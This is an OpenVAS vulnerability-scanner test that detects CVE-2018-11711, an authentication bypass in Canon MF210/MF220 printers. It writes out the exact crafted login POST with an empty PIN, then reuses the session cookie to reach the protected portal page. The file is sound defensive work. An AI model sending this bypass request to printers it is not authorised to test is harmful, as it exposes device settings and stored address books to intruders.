###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_canon_printers_access_bypass_vuln.nasl 10143 2018-06-08 13:43:47Z santu $
#
# Canon MF210/MF220 Series Printers Access Bypass Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.813416");
  script_version("$Revision: 10143 $");
  script_cve_id("CVE-2018-11711");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-06-08 15:43:47 +0200 (Fri, 08 Jun 2018) $");
  script_tag(name:"creation_date", value:"2018-06-05 11:37:19 +0530 (Tue, 05 Jun 2018)");
  script_name("Canon MF210/MF220 Series Printers Access Bypass Vulnerability");

  script_tag(name:"summary", value:"This host is running Canon Printer and is
  prone to an access bypass vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check
  whether we are able to bypass access.");

  script_tag(name:"insight", value:"The flaw exists due to insufficient access
  restrictions at any URL of the device that requires authentication.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to bypass the authentication without a PIN at any URL of the device
  that requires authentication.

  Impact Level: Application");

  script_tag(name:"affected", value:"Canon printers MF210 and MF220 Series");

  script_tag(name:"solution", value:"No known solution is available as of 05th June, 2018.
  Information regarding this issue will be updated once solution details are available.
  For updates refer to Reference links.");

  script_tag(name:"solution_type", value:"NoneAvailable");
  script_tag(name:"qod_type", value:"remote_vul");
  
  script_xref(name : "URL" , value:"https://global.canon/en/index.html");
  script_xref(name : "URL" , value:"https://gist.github.com/huykha/9dbcd0e46058f1e18bab241d1b2754bd");

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_category(ACT_GATHER_INFO);
  script_family("General");
  script_dependencies("gb_canon_printers_detect.nasl");
  script_mandatory_keys("canon_printer/installed", "canon_printer_model");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if(!canonPort = get_app_port(cpe:"cpe:/h:canon:mf220_series"))
{
  if(!canonPort = get_app_port(cpe:"cpe:/h:canon:mf210_series")){
    exit(0);
  }
}

model = get_kb_item("canon_printer_model");
if(!model || !(model =~ "(MF210|MF220)")){
  exit(0);
}

req = http_post_req( port:canonPort,
                     url:"/tryLogin.cgi",
                     data:'loginM=&0000=0010&0001=&0002=',
                     add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded"));

res = http_keepalive_send_recv( port:canonPort, data:req);

##Confirm Redirection and cookie setting
if(res =~ "^(HTTP/1.. 303)" && "Location:" >< res && "Set-Cookie" >< res)
{
  cookie = eregmatch( pattern:"Set-Cookie: (fusion-http-session-id=([0-9a-zA-Z]+));", string:res );
  cookie = cookie[1];
}

req = http_get_req( port:canonPort, url:"/portal_top.html", add_headers:make_array( "Cookie", cookie ) );
res = http_keepalive_send_recv( port:canonPort, data:req);

if(res =~ "^(HTTP/1.. 200 OK)" && ">Log Out<" >< res && ">Copyright CANON INC" >< res &&
   ">Address Book<" >< res && ">Cartridge Information<" >< res && ">Device Status<" >< res)
{
  report = report_vuln_url(port:canonPort, url:"/portal_top.html");
  security_message(port:canonPort, data:report);
  exit(0);
}
exit(0);
